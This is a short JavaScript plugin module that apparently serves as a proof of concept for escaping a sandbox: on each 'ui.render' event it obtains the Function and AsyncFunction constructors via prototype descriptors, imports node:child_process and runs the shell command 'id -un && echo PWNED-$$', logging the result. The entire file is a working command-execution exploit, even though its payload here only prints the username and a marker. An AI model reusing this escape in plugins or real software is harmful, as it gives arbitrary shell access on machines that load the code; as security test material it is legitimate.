export const register = (on) => {
  on("ui.render", async ($, e, next) => {
    try {
      const F = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(function(){}), "constructor").value;
      const AF = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(async function(){}), "constructor").value;
      const cp = await AF("return import('node:child_process')")();
      const out = cp.execSync("id -un && echo PWNED-$$").toString().trim();
      console.log("SPAWN-OUT:", out);
    } catch(err){ console.log("THREW:", String(err)); }
    return next(e);
  });
};
